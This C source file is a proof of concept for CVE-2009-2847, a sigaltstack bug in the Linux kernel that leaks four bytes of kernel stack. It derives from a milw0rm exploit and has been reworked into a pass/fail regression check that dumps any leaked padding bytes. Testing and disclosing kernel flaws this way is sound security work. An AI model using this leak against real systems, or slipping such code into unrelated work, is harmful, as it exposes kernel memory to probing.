/* 
 * <!-- based on http://milw0rm.com/exploits/9352 -->
 *
 * sigaltstack-leak.c
 *
 * Linux Kernel <= 2.6.31-rc5 sigaltstack 4-Byte Stack Disclosure
 * Jon Oberheide <jon@oberheide.org>
 * http://jon.oberheide.org
 *
 * Updated by Steve Beattie and Kees Cook
 *
 * Information:
 *
 *   CVE-2009-2847
 *   https://bugzilla.redhat.com/show_bug.cgi?id=515392
 *
 *   http://git.kernel.org/linus/0083fc2c50e6c5127c2802ad323adf8143ab7856
 *
 *   Ulrich Drepper correctly points out that there is generally padding in
 *   the structure on 64-bit hosts, and that copying the structure from
 *   kernel to user space can leak information from the kernel stack in those
 *   padding bytes.
 *
 * Notes:
 *
 *   Only 4 bytes of uninitialized kernel stack are leaked in the padding
 *   between stack_t's ss_flags and ss_size.  The disclosure only affects
 *   affects 64-bit hosts.
 */

#include <stdio.h>
#include <stddef.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>
#include <time.h>
#include <sys/syscall.h>
#include <sys/types.h>

const int randcalls[] = {
	/* Don't include syscalls that hang or alarm */
	SYS_write,
	SYS_open,
	SYS_stat,
	SYS_lstat,
	SYS_lseek,
	SYS_mmap,
	SYS_mprotect,
	SYS_munmap,
	SYS_rt_sigaction,
	SYS_rt_sigprocmask,
	SYS_ioctl,
	SYS_access,
	SYS_pipe,
	SYS_dup,
	SYS_dup2,
	SYS_getitimer,
	SYS_alarm, /* ?? */
	SYS_getpid,
	SYS_flock,
	SYS_getdents,
	SYS_getcwd,
	SYS_gettimeofday,
	SYS_getuid,
	SYS_setuid,
	SYS_setgid,
	SYS_geteuid,
	SYS_getegid,
	SYS_setpgid,
	SYS_getpgrp,
	SYS_setsid,
	SYS_setreuid,
	SYS_setregid,
	SYS_setgroups,
	SYS_getpgid,
	SYS_setfsuid,
	SYS_setfsgid,
	SYS_getsid,
	SYS_getpriority,
	SYS_setpriority,
	SYS_sched_get_priority_max,
};

void dump(const char *name, const unsigned char *p, unsigned l)
{
	printf("%s:", name);
	while (l > 0) {
		printf(" ");
		if (l == 12) {
			printf("*** ");
		}
		printf("%02x", *p);
		if (l == 9) {
			printf(" ***");
		}
		++p; --l;
	}
	printf("\n");
}

void check_stack(stack_t *stack)
{
	stack_t *copy = calloc(1, sizeof(stack_t));

	copy->ss_sp = stack->ss_sp;
	copy->ss_size = stack->ss_size;
	copy->ss_flags = stack->ss_flags;

	if (memcmp(stack, copy, sizeof(stack_t))) {
		printf("FAIL\n");
		dump("stack", (unsigned char *) stack, sizeof(*stack));
		dump("copy ", (unsigned char *) copy, sizeof(*copy));
		exit(1);
	}
}

void signal_handler(int n)
{
	if (n == SIGSEGV) {
		printf("Caught SIGSEGV, ignoring\n");
	}

	return;
}
int main(void)
{
	int call, ret, i;
	size_t size, ftest, stest;
	stack_t oss;
	const struct sigaction st = {
		.sa_handler = &signal_handler,
	};

	size = sizeof(stack_t);
	memset(&oss, '\0', size);

	printf("[+] Checking platform...\n");

	if (size == 24) {
		printf("[+] sizeof(stack_t) = %zu\n", size);
		printf("[+] Correct size, 64-bit platform.\n");
	} else {
		printf("[-] sizeof(stack_t) = %zu\n", size);
		printf("[-] Warning: you do not appear to be on a 64-bit platform.\n");
		printf("[-] No information disclosure is possible.\n");
		//exit(0);
	}

	ftest = offsetof(stack_t, ss_flags) + sizeof(oss.ss_flags);
	stest = offsetof(stack_t, ss_size);

	printf("[+] Checking for stack_t hole...\n");

	if (ftest != stest) {
		printf("[+] ss_flags end (%zu) != ss_size start (%zu)\n", ftest, stest);
		printf("[+] Hole in stack_t present!\n");
	} else {
		printf("[-] ss_flags end (%zu) == ss_size start (%zu)\n", ftest, stest);
		printf("[-] Warning: No hole in stack_t, so skipping this test.\n");
		exit(0);
	}

	printf("[+] Ready to call sigaltstack.\n\n");
	fflush(NULL);

/*
	for (ret = 5; ret > 0; ret--) {
		printf("%d...\n", ret);
		sleep(1);
	}
*/
	srand(time(NULL));

	for (i = 0; i < 4096; i++) {
		/* random stuff to make stack pseudo-interesting */
		call = rand() % (sizeof(randcalls) / sizeof(int));
		/*
		printf("syscall %d\n",randcalls[call]);
		fflush(NULL);
		*/

		/* some bad syscalls on powerpc64el cause a userspace
		 * SIGSEGV, so trap it */
		sigaction(SIGSEGV, &st, NULL);

		syscall(randcalls[call]);

		ret = sigaltstack(NULL, &oss);
		if (ret != 0) {
			printf("[-] Error: sigaltstack failed.\n");
			exit(1);
		}

		check_stack(&oss);
	}

	printf("ok\n");
	return 0;
}

// milw0rm.com [2009-08-04]
